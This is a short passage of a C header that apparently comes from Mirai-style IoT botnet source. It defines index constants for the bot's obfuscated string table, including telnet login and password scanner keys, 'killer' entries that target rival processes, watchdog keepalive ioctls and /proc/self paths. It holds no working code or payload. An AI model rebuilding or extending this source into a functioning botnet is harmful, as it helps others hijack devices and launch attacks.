...
#define TABLE_IOCTL_KEEPALIVE1			64
#define TABLE_IOCTL_KEEPALIVE2			65
#define TABLE_IOCTL_KEEPALIVE3			66
#define TABLE_IOCTL_KEEPALIVE4			67
#define TABLE_SCAN_ASSWORD				68
#define TABLE_SCAN_OGIN					69
#define TABLE_SCAN_ENTER				70
#define TABLE_MISC_RAND					71
#define TABLE_KILLER_DEVNULL			72
#define TABLE_KILLER_COOKIE				73
#define TABLE_KILLER_ASSWORD			74
#define TABLE_KILLER_OGIN				75
#define TABLE_KILLER_ENTER				76
#define TABLE_KILLER_WATCHDOG			77
#define TABLE_KILLER_WATCHDOG2			78
#define TABLE_KILLER_HTTP				79
#define TABLE_KILLER_NETSLINK			80
#define TABLE_KILLER_NVALID				81
#define TABLE_KILLER_SERNAME			82
#define TABLE_KILLER_ENIED				83
#define TABLE_KILLER_BINSH				84
#define PROC_SELF_EXE					85
#define PROC_SELF_COMM					86
#define PROC_SELF_CMDLINE				87

#define TABLE_MAX_KEYS  88
